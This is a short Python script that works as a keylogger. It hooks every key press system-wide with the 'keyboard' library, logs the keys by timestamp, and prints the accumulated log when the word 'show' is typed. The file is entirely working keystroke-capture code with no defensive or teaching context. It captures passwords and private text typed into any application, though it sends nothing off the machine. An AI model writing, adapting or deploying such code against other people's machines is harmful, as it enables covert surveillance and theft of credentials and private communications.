
import keyboard
from datetime import datetime


dicti = {}
dicti_for_show = {"all times":''}

def on_key_press(key):
    global dicti_for_show,dicti
    key = key.name
    key = key.lower()
    currentTime = datetime.now().strftime('%d/%m/%y %H:%M')


    if currentTime not in dicti:
        dicti[currentTime] = ''

    dicti[currentTime] += key
    dicti_for_show["all times"] += key
    #print(key)

    if "show" in dicti_for_show["all times"]:
        for k,v in dicti.items():
            print()
            print(k)
            print(v)
            print()
        dicti = {}
        dicti_for_show = {"all times": ''}






keyboard.on_press(on_key_press)
keyboard.wait('Ctrl + Shift + .')
